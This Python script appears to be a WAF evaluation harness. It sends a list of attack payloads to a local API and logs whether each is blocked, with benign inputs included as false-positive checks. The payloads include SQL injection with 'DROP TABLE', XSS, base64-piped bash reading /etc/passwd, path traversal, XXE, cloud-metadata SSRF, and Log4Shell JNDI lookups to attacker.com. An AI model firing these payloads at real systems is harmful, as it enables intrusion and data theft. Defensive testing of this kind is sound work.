import requests
import time
import json
import urllib.parse
import os

API_URL = "http://localhost:5000"

PAYLOADS = {
    "SQL Injection": {
        "Basic": "' OR '1'='1",
        "Blind Time-based": "' AND (SELECT SLEEP(5))--",
        "Union": "' UNION SELECT username, password FROM users--",
        "Boolean": "' AND 1=1--",
        "Stacked": "'; DROP TABLE users--"
    },
    "XSS": {
        "Basic": "<script>alert(1)</script>",
        "DOM": "\"><img src=x onerror=alert(document.cookie)>",
        "Obfuscated": "<scr<script>ipt>alert(1)</script>"
    },
    "Command Injection": {
        "Basic": "; cat /etc/passwd",
        "Pipe": "| whoami",
        "Base64 Exec": "echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash"
    },
    "Path Traversal": {
        "Basic": "../../../etc/passwd",
        "Windows": "..\\..\\..\\windows\\system32\\cmd.exe",
        "Directory Traversal": "..%2f..%2f..%2fetc%2fpasswd"
    },
    "XXE": {
        "Basic": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>"
    },
    "SSRF": {
        "Basic": "http://169.254.169.254/latest/meta-data/",
        "Localhost": "http://127.0.0.1/admin"
    },
    "SSTI": {
        "Jinja2": "{{7*7}}",
        "EL": "${7*7}"
    },
    "Log4Shell": {
        "Basic": "${jndi:ldap://attacker.com/a}",
        "Obfuscated": "${${lower:j}ndi:ldap://attacker.com/a}"
    },
    "Payload Variations": {
        "URL Encoded SQLi": urllib.parse.quote("' OR '1'='1"),
        "Double URL Encoded SQLi": urllib.parse.quote(urllib.parse.quote("' OR '1'='1")),
        "Unicode SQLi": "\\u0027 OR \\u00271\\u0027=\\u00271",
        "Mixed (SQLi + XSS)": "' OR '1'='1; <script>alert(1)</script>"
    },
    "Legitimate (False Positives)": {
        "Login": "user123",
        "Search": "Apple iPhone 15 Pro Max",
        "Filename": "filename=report_2024.pdf",
        "URL": "https://google.com/search?q=test",
        "JSON": '{"username":"john", "role":"admin", "age": 30}',
        "XML": "<user><name>john</name><role>admin</role></user>"
    }
}

results = []

def run_test():
    print(f"Testing against running API: {API_URL}")
    for category, attacks in PAYLOADS.items():
        for name, payload in attacks.items():
            # We'll use a dummy endpoint that exists
            endpoint = f"{API_URL}/api/products"
            
            # For JSON/XML we send as body, others as query param 'search'
            if name in ["JSON", "XML"]:
                method = "POST"
                headers = {"Content-Type": "application/json"}
                data = payload
                params = {}
                endpoint = f"{API_URL}/api/data"
            else:
                method = "GET"
                headers = {}
                data = None
                params = {"search": payload}

            start_time = time.time()
            try:
                # Login first to get the auth cookie
                session = requests.Session()
                login_resp = session.post(f"{API_URL}/api/auth/login", json={"username": "admin", "password": "password"})
                
                if method == "GET":
                    resp = session.get(endpoint, params=params, headers=headers, timeout=5)
                else:
                    resp = session.post(endpoint, data=data, headers=headers, timeout=5)
                elapsed = (time.time() - start_time) * 1000
                
                status_code = resp.status_code
                try:
                    resp_json = resp.json()
                    resp_body = json.dumps(resp_json)
                except:
                    resp_body = resp.text[:100]

                action = "Blocked" if status_code in [403, 429] else "Allowed"

                print(f"[{category} - {name}] {status_code} {action} ({elapsed:.1f}ms) | Response: {resp_body}")
                
                results.append({
                    "category": category,
                    "name": name,
                    "payload": payload,
                    "http_request": f"{method} {resp.request.url}",
                    "status_code": status_code,
                    "action": action,
                    "response_time_ms": round(elapsed, 2),
                    "http_response": resp_body
                })

            except Exception as e:
                print(f"[{category} - {name}] ERROR: {e}")
                results.append({
                    "category": category,
                    "name": name,
                    "payload": payload,
                    "http_request": f"{method} {endpoint}",
                    "status_code": 0,
                    "action": "Error",
                    "response_time_ms": 0,
                    "http_response": str(e)
                })
            
            time.sleep(0.1) # brief pause to avoid strict rate limiting blocking legitimate requests

    with open("real_eval_results.json", "w") as f:
        json.dump(results, f, indent=2)
    print("Done.")

if __name__ == "__main__":
    run_test()
